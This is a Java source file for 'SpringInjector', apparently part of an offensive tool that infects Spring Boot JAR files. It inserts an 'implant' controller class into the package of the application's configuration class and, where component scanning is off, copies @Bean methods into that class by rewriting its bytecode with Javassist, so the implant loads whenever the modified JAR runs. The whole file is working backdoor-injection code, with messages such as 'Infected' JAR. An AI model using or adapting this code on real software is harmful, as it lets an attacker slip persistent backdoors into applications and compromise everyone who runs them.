package org.example.injector;

import javassist.bytecode.*;
import javassist.bytecode.annotation.Annotation;
import javassist.bytecode.annotation.MemberValue;
import org.example.implants.SpringImplantConfiguration;
import org.example.implants.SpringImplantController;

import java.io.DataInputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;
import java.util.jar.JarEntry;

import static org.example.injector.Helpers.*;

public class SpringInjector {
    private final Class<?> implantComponentClass;
    private final Class<?> implantSpringConfigClass;


    SpringInjector(Class<?> implantComponent, Class<?> implantSpringConfig) {
        this.implantComponentClass = implantComponent;
        this.implantSpringConfigClass = implantSpringConfig;
    }

    // TODO This CLI logic will be merged into the main Cli class
    public static void main(String[] args) {
        if (args.length < 2) {
            System.exit(1);
        }

        SpringInjector injector = new SpringInjector(SpringImplantController.class, SpringImplantConfiguration.class);
        try {
            Path targetPath = Path.of(args[0]);
            Path outputPath = Path.of(args[1]);
            System.out.println("[i] Target JAR: " + targetPath);
            System.out.println("[i] Output JAR: " + outputPath);
            if (!Files.exists(targetPath) && !Files.isRegularFile(targetPath)) {
                System.out.println("[!] Target JAR is not a regular existing file.");
                System.exit(1);
            }
            if (Files.exists(outputPath) && targetPath.toRealPath().equals(outputPath.toRealPath())) {
                System.out.println("[-] Target JAR and output JAR cannot be the same.");
                System.exit(1);
            }
            if (injector.infect(targetPath, outputPath)) {
                System.out.println("[+] Infected '" + targetPath + "'. Modified JAR available at: " + outputPath);
            } else {
                System.out.println("[-] Did not infect '" + targetPath + "'.");
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
        boolean didInfect = false;
        boolean foundSignedClasses = false;
        try (JarFileFiddler fiddler = JarFileFiddler.open(targetJarFilePath, outputJar)) {
            for (JarFileFiddler.WrappedJarEntry entry : fiddler) {
                if (!entry.getName().endsWith(".class")) {
                    entry.passOn();
                    continue;
                }
                if (entry.getEntry().getCodeSigners() != null) {
                    foundSignedClasses = true;
                    entry.passOn();
                    continue;
                }

                ClassFile currentlyProcessing;
                try (DataInputStream in = new DataInputStream(entry.getContent())) {
                    currentlyProcessing = new ClassFile(in);
                    if (!isSpringConfigurationClass(currentlyProcessing)) {
                        entry.passOn();
                        continue;
                    }
                    System.out.println("[+] Found Spring configuration: " + entry.getName());

                    /*
                     * By adding our own Spring component (like a RestController) into the JAR under the same package
                     * as the Spring config class, Spring will happily load it automatically. This is assuming that
                     * @ComponentScan is used (included in the @SpringBootApplication annotation). If not, then this
                     * component needs to be explicitly referenced as a @Bean in the config class.
                     */
                    ClassFile implantComponent = ImplantReader.findAndReadClassFile(implantComponentClass);
                    String targetPackageName = parsePackageNameFromFqcn(currentlyProcessing.getName());
                    String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
                    implantComponent.setName(targetPackageName + "." + implantComponentClassName);
                    JarEntry newJarEntry = convertToSpringJarEntry(implantComponent);
                    implantComponent.write(fiddler.addNewEntry(newJarEntry));
                    System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");

                    if (!hasComponentScanEnabled(currentlyProcessing)) {
                        /*
                         * Component Scanning seems to not be enabled for this Spring configuration.
                         * Thus, it's necessary to add a @Bean annotated method returning an instance of the component.
                         */
                        System.out.println("[-] Spring configuration is not set to automatically scan for components (@ComponentScan).");

                        if (!addBeanToSpringConfig(currentlyProcessing, implantComponent)) {
                            System.out.println("[-] Class '" + currentlyProcessing.getName() + "' already infected. Skipping.");
                            entry.passOn();
                            continue;
                        }

                        currentlyProcessing.write(entry.addAndGetStream());
                        System.out.println("[+] Injected @Bean method into '" + currentlyProcessing.getName() + "'.");
                    } else {
                        entry.passOn();
                    }

                    didInfect = true;
                } catch (ClassNotFoundException e) {
                    throw new RuntimeException(e);
                }
            }

            if (foundSignedClasses) {
                System.out.println("[-] Found signed classes. These were not considered for infection.");
            }
        }

        return didInfect;
    }

    private boolean addBeanToSpringConfig(ClassFile existingSpringConfig, ClassFile implantComponent) throws IOException, ClassNotFoundException {
        ClassFile implantSpringConfig = ImplantReader.findAndReadClassFile(implantSpringConfigClass);
        String implantPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(implantSpringConfig.getName()));
        String targetPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(existingSpringConfig.getName()));
        String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());

        // Copy all @Bean annotated methods from implant config class to target config class (if not already exists)
        for (MethodInfo implantBeanMethod : findAllSpringBeanMethods(implantSpringConfig)) {
            MethodInfo existingImplantControllerBean = existingSpringConfig.getMethod(implantBeanMethod.getName());
            if (existingImplantControllerBean != null) {
                return false;
            }

            try {
                Map<String, String> translateTable = new HashMap<>();
                translateTable.put(implantPackageDesc + "/" + implantComponentClassName, targetPackageDesc + "/" + implantComponentClassName);
                translateTable.put(convertToClassFormatFqcn(implantSpringConfig.getName()), convertToClassFormatFqcn(existingSpringConfig.getName()));

                String implantBeanMethodDesc = implantBeanMethod.getDescriptor().replace(implantPackageDesc, targetPackageDesc);
                MethodInfo targetBeanMethod = new MethodInfo(existingSpringConfig.getConstPool(), implantBeanMethod.getName(), implantBeanMethodDesc);
                targetBeanMethod.getAttributes().removeIf(Objects::isNull); // Workaround for some internal bug in Javassist

                CodeAttribute codeAttr = (CodeAttribute) implantBeanMethod.getCodeAttribute().copy(existingSpringConfig.getConstPool(), translateTable);
                codeAttr.setMaxLocals(implantBeanMethod.getCodeAttribute().getMaxLocals());
                targetBeanMethod.setCodeAttribute(codeAttr);

                ExceptionsAttribute exceptionsAttr = implantBeanMethod.getExceptionsAttribute();
                if (exceptionsAttr != null) {
                    ExceptionsAttribute exceptions = (ExceptionsAttribute) exceptionsAttr.copy(existingSpringConfig.getConstPool(), translateTable);
                    targetBeanMethod.setExceptionsAttribute(exceptions);
                }

                copyAllMethodAnnotations(targetBeanMethod, implantBeanMethod);

                existingSpringConfig.addMethod(targetBeanMethod);
            } catch (DuplicateMemberException e) {
                throw new RuntimeException(e);
            }
        }

        return true;
    }

    // Copy all annotations from implant method to target method. Notice the const pools!
    private static void copyAllMethodAnnotations(MethodInfo target, final MethodInfo source) {
        AttributeInfo sourceAttr = source.getAttribute("RuntimeVisibleAnnotations");
        if (sourceAttr == null) {
            // The source method does not have any annotations. Is this fine?
            return;
        }
        if (!(sourceAttr instanceof AnnotationsAttribute sourceAnnotationsAttr)) {
            throw new RuntimeException("Failed to make sense of RuntimeVisibleAnnotations.");
        }

        AnnotationsAttribute targetAnnotationsAttr = new AnnotationsAttribute(target.getConstPool(), "RuntimeVisibleAnnotations");
        for (Annotation annotation : sourceAnnotationsAttr.getAnnotations()) {
            Annotation copiedAnnotation = new Annotation(annotation.getTypeName(), target.getConstPool());
            if (annotation.getMemberNames() != null) {
                for (String memberValueName : annotation.getMemberNames()) {
                    MemberValue memberValue = annotation.getMemberValue(memberValueName);
                    copiedAnnotation.addMemberValue(memberValueName, memberValue);
                }
            }
            targetAnnotationsAttr.addAnnotation(copiedAnnotation);
        }

        target.addAttribute(targetAnnotationsAttr);
    }

    private static List<MethodInfo> findAllSpringBeanMethods(ClassFile springController) {
        List<MethodInfo> results = new ArrayList<>(1);

        for (MethodInfo method : springController.getMethods()) {
            AttributeInfo attr = method.getAttribute("RuntimeVisibleAnnotations");
            if (attr == null) {
                continue;
            }
            if (!(attr instanceof AnnotationsAttribute annotationAttr)) {
                throw new RuntimeException("Failed to make sense of RuntimeVisibleAnnotations.");
            }

            for (Annotation annotation : annotationAttr.getAnnotations()) {
                String annotationType = annotation.getTypeName();
                if (annotationType.equals("org.springframework.context.annotation.Bean")) {
                    results.add(method);
                }
            }
        }

        return results;
    }

    private static boolean isSpringConfigurationClass(final ClassFile classFile) {
        List<Annotation> springAnnotations = classFile.getAttributes().stream()
                .filter(attribute -> attribute instanceof AnnotationsAttribute)
                .map(attribute -> (AnnotationsAttribute) attribute)
                .filter(annotationAttribute -> annotationAttribute.getName().equals("RuntimeVisibleAnnotations"))
                .flatMap(runtimeAnnotationAttribute -> Arrays.stream(runtimeAnnotationAttribute.getAnnotations())
                        .filter(SpringInjector::isAnySpringContextAnnotation)
                )
                .toList();
        return !springAnnotations.isEmpty();
    }

    private static boolean isAnySpringContextAnnotation(final Annotation annotation) {
        return switch (annotation.getTypeName()) {
            case "org.springframework.boot.autoconfigure.SpringBootApplication" -> true;
            case "org.springframework.context.annotation.Configuration" -> true;
            default -> false;
        };
    }

    private static boolean hasComponentScanEnabled(final ClassFile springContextClassFile) {
        List<Annotation> componentScanAnnotations = springContextClassFile.getAttributes().stream()
                .filter(attribute -> attribute instanceof AnnotationsAttribute)
                .map(attribute -> (AnnotationsAttribute) attribute)
                .filter(annotationAttribute -> annotationAttribute.getName().equals("RuntimeVisibleAnnotations"))
                .flatMap(runtimeAnnotationAttribute -> Arrays.stream(runtimeAnnotationAttribute.getAnnotations())
                        .filter(annotation -> annotation.getTypeName().equals("org.springframework.context.annotation.ComponentScan"))
                )
                .toList();
        return !componentScanAnnotations.isEmpty();
    }
}
